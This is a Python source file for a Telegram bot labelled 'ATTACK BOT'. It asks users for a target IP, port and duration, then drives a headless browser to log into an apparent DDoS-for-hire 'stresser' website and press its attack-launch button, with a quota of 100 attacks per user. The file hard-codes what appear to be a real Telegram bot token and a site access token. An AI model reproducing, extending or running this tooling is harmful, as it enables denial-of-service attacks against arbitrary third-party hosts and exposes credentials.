import os
import json
import logging
import threading
import time
import asyncio
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from playwright.async_api import async_playwright

# ==================== CONFIG ====================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8521144614:AAEMAgYMWzljYmC_Cjw-258KEO-G92G2B3s"
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"
WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"

# ==================== ATTACK TRACKING ====================
attack_file = "attacks.json"

def load_attacks():
    try:
        with open(attack_file, 'r') as f:
            return json.load(f)
    except:
        return {"current": None, "user_counts": {}}

def save_attacks(data):
    with open(attack_file, 'w') as f:
        json.dump(data, f, indent=2)

attacks = load_attacks()

# ==================== PLAYWRIGHT ATTACK FUNCTION ====================
async def launch_attack_playwright(ip, port, duration):
    try:
        async with async_playwright() as p:
            # Launch browser
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()
            
            # === LOGIN ===
            await page.goto(LOGIN_URL)
            await page.wait_for_selector('input[name="token"]', timeout=10000)
            await page.fill('input[name="token"]', WEBSITE_TOKEN)
            
            # Check for CAPTCHA
            captcha = await page.query_selector('input[name="captcha"]')
            if captcha:
                return False, "CAPTCHA_REQUIRED"
            
            await page.click('button:has-text("Login")')
            
            # === WAIT FOR PAGE LOAD ===
            await page.wait_for_timeout(3000)  # 3 seconds wait
            
            # === ATTACK PAGE ===
            await page.goto(WEBSITE_URL)
            await page.wait_for_timeout(3000)  # Wait for page to load
            
            # === DEBUG: Save page source ===
            content = await page.content()
            with open("debug_page.html", "w", encoding="utf-8") as f:
                f.write(content)
            print("✅ Page source saved to debug_page.html")
            
            # === FIND INPUT FIELDS ===
            inputs = await page.query_selector_all('input[type="text"]')
            print(f"🔍 Found {len(inputs)} text input fields")
            
            if len(inputs) >= 3:
                # Fill IP (first text input)
                await inputs[0].fill(ip)
                print(f"✅ IP entered: {ip}")
                
                # Fill Port (second text input)
                await inputs[1].fill(str(port))
                print(f"✅ Port entered: {port}")
                
                # Fill Duration (third text input)
                await inputs[2].fill(str(duration))
                print(f"✅ Duration entered: {duration}")
            else:
                return False, f"❌ Sirf {len(inputs)} text inputs mile"
            
            # === FIND LAUNCH BUTTON ===
            buttons = await page.query_selector_all('button')
            launch_btn = None
            for btn in buttons:
                btn_text = await btn.text_content()
                if btn_text and "Launch" in btn_text:
                    launch_btn = btn
                    break
            
            if not launch_btn:
                return False, "❌ Launch button nahi mila"
            
            await launch_btn.click()
            print("✅ Launch button clicked")
            
            await page.wait_for_timeout(2000)
            await browser.close()
            return True, "SUCCESS"
            
    except Exception as e:
        return False, str(e)

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🎯 Launch Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("🤖 **ATTACK BOT**\n\nClick below to start attack:", reply_markup=reply_markup)

async def attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if attacks.get("current") is not None:
        await update.message.reply_text("⚠️ Attack already running. Wait!")
        return
    
    context.user_data["step"] = "ip"
    keyboard = [[KeyboardButton("❌ Cancel")]]
    await update.message.reply_text("🎯 **STEP 1/3**\nSend IP:\nExample: `1.1.1.1`", 
                                   reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    
    if text == "❌ Cancel":
        context.user_data.clear()
        await start(update, context)
        return
    
    if text == "🎯 Launch Attack":
        await attack_start(update, context)
        return
    
    if "step" in context.user_data:
        step = context.user_data["step"]
        
        if step == "ip":
            context.user_data["ip"] = text
            context.user_data["step"] = "port"
            await update.message.reply_text("✅ IP saved\n\n**STEP 2/3**\nSend Port:\nExample: `80`")
            
        elif step == "port":
            try:
                port = int(text)
                context.user_data["port"] = port
                context.user_data["step"] = "duration"
                
                keyboard = [
                    [InlineKeyboardButton("30s", callback_data="dur_30"),
                     InlineKeyboardButton("60s", callback_data="dur_60"),
                     InlineKeyboardButton("120s", callback_data="dur_120")],
                    [InlineKeyboardButton("180s", callback_data="dur_180"),
                     InlineKeyboardButton("240s", callback_data="dur_240"),
                     InlineKeyboardButton("300s", callback_data="dur_300")]
                ]
                await update.message.reply_text(
                    f"✅ IP: `{context.user_data['ip']}`\n✅ Port: `{port}`\n\n**STEP 3/3**\nSelect duration:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            except:
                await update.message.reply_text("❌ Invalid port. Send number:")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("dur_"):
        duration = int(query.data.split("_")[1])
        
        if "ip" not in context.user_data or "port" not in context.user_data:
            await query.message.edit_text("❌ Session expired. Start again.")
            return
        
        ip = context.user_data["ip"]
        port = context.user_data["port"]
        user_id = query.from_user.id
        context.user_data.clear()
        
        attacks["current"] = {"ip": ip, "port": port, "duration": duration, "user_id": user_id}
        save_attacks(attacks)
        
        await query.message.edit_text(f"🔄 **LAUNCHING ATTACK...**\n\nTarget: `{ip}:{port}`\nDuration: {duration}s")
        
        # Run Playwright attack
        loop = asyncio.get_event_loop()
        
        def attack_thread():
            try:
                # Run async function in thread
                success, result = asyncio.run_coroutine_threadsafe(
                    launch_attack_playwright(ip, port, duration), 
                    loop
                ).result()
                
                attacks["current"] = None
                
                counts = attacks.get("user_counts", {})
                counts[str(user_id)] = counts.get(str(user_id), 0) + 1
                attacks["user_counts"] = counts
                save_attacks(attacks)
                
                remaining = 100 - counts.get(str(user_id), 0)
                
                async def send_result():
                    if success:
                        await context.bot.send_message(
                            chat_id=query.message.chat_id,
                            text=f"✅ **ATTACK COMPLETED!**\n\n`{ip}:{port}`\n{duration}s\n🎯 Remaining: {remaining}/100"
                        )
                    else:
                        await context.bot.send_message(
                            chat_id=query.message.chat_id,
                            text=f"❌ **FAILED**\n\n{result}"
                        )
                
                asyncio.run_coroutine_threadsafe(send_result(), loop)
                
            except Exception as e:
                attacks["current"] = None
                save_attacks(attacks)
                
                async def send_error():
                    await context.bot.send_message(
                        chat_id=query.message.chat_id,
                        text=f"❌ **ERROR**\n\n{str(e)}"
                    )
                
                asyncio.run_coroutine_threadsafe(send_error(), loop)
        
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True
        thread.start()

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("="*50)
    print("🔥 PLAYWRIGHT ATTACK BOT STARTED")
    print("="*50)
    print(f"👤 Everyone gets 100 attacks")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
